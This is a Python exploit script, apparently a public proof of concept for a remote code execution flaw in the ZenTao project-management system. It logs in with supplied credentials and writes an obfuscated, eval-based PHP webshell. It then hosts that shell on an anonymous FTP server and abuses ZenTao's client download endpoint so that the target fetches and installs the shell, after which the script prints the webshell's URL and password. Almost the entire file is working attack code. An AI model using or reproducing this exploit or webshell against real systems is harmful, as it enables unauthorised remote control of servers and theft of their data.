#!/usr/bin/python
#coding:utf-8

import argparse
from colorama import *
import requests
import os
import re
import socket
import time
import base64
import threading

from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

init(autoreset=True)
def banner():
	print("\033[0;32;40m\t\t\t\tZentao RCE EXP\033[0m")
	print("                      __                                        ")
	print("________ ____   _____/  |______    ____   _______   ____  ____  ")
	print("\___   // __ \ /    \   __\__  \  / _  \  \_  __ \_/ ___\/ __ \ ")
	print(" /    /\  ___/|   |  \  |  / __ \( <_>  )  |  | \/\  \__\  ___/ "+"\033[0;36;40m\t风起\033[0m")
	print(" /_____ \\___  >___|  /__| (____ / \____/   |__|    \___  >___  >")
	print("      \/    \/     \/         \/                       \/    \/ ")
	print("\033[0;33;40m\t\t\t\t一杯就倒好大哥\033[0m")
	print("\n")

	print("用法:")
	print("	--help:帮助文档")
	print("	-H:目标域名 (-H http://127.0.0.1)")
	print("	-P:指定FTP服务器IP (-f 192.168.52.1)")			#请指定 [以太网适配器 VMware Network Adapter VMnet8] 的IP
	print("	-U:指定用户名 (-U admin)")
	print("	-P:指定密码 (-P Admin888)")
	
	
def WriteShell():
	shell="""
	<?php
	echo "This is Webshell!"
    session_start();
    @set_time_limit(0);
	@error_reporting(0);
    function E($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[$i+1&15];
        }
        return $D;
    }
    function Q($D){
        return base64_encode($D);
    }
    function O($D){
        return base64_decode($D);
    }
    $P='pass';
    $V='payload';
    $T='3c6e0b8a9c15224a';
    if (isset($_POST[$P])){
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V])){
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C{public function nvoke($p) {eval($p."");}}
            $R=new C();
			$R->nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        }else{
            $_SESSION[$V]=$F;
        }
    }
	?>
	"""
	with open("shell.php", 'w') as file:
		file.write(shell)
		
def OpenFTP():
	try:
		authorizer = DummyAuthorizer()
		authorizer.add_anonymous(".")
		handler = FTPHandler
		handler.authorizer = authorizer
		handler.banner = "pyftpdlib based ftpd ready."
		address = ('0.0.0.0', 21)
		server = FTPServer(address, handler)
		server.max_cons = 256
		server.max_cons_per_ip = 5
		server.serve_forever()
		
	except Exception as e:
		print(Fore.RED+"FTP服务器启动失败！")
		pass
def login(host,username,password):
	session=requests.session()
	headers={
		"Referer" : "http://"+host+"/zentaopms/www/index.php?m=user&f=login",
		"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
	}
	pdata={"account":username,"password":password}
	response=session.post(host+"/zentaopms/www/index.php?m=user&f=login&t=html",data=pdata,timeout=3)	#根据目标实际环境修改路径，本处仅适用于测试靶机
	return session

def exploit(host,session,ip):
	shell="ftp://"+ip+"/shell.php"
	str_param=str(base64.b64encode(bytes(shell,'utf-8')))
	str_param=str(str_param)
	pattern = re.compile("'(.*)'")
	str_re1 = pattern.findall(str_param)
	UploadFile=session.get(host+"/zentaopms/www/index.php?m=client&f=download&version=2&link="+str_re1[0])		#如果目标URL地址不同请根据实际情况修改此处
	Access=requests.get(host+"/zentaopms/www/data/client/2/shell.php")
	if Access.status_code is 200:
		print(Fore.GREEN+"[*] 攻击利用成功！")
		print(Fore.GREEN+"Webshell URL is "+host+"/zentaopms/www/data/client/2/shell.php 密码:pass 密钥:KEY\n")
	else:
		print(Fore.RED+"漏洞利用失败!")
def main():
	try:
		parser = argparse.ArgumentParser()
		parser.add_argument("-H","--host", help="目标域名")
		parser.add_argument("-U","--username",help="指定用户名")
		parser.add_argument("-P","--password",help="指定密码")
		parser.add_argument("-f","--ftphost",help="指定FTP服务器IP")
		print("\n")
		args = parser.parse_args()
		if(args.host==None):
			print("\033[41m域名不能为空!")
			exit(0)
		elif(args.ftphost==None):
			print("\033[41mFTP IP不能为空!")
			exit(0)
		host=args.host
		HttpError=args.host.find("http://")
		if HttpError is -1:
			print("\033[41m默认使用http协议如需指定https协议请在url前手动指定。")
			host="http://"+args.host
		print(Fore.GREEN+"[*] Starting at "+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
		session=login(host,args.username,args.password)
		WriteShell()
		exploit(args.host,session,args.ftphost)
	except(Exception) as e:
		print(e)
		print("\033[41m请检查语法是否存在错误!")
		pass	

if __name__=="__main__":
		banner()
		time.sleep(1)
		t1 = threading.Thread(target=OpenFTP)
		time.sleep(1)
		t2 = threading.Thread(target=main) 
		t1.start()  
		t2.start()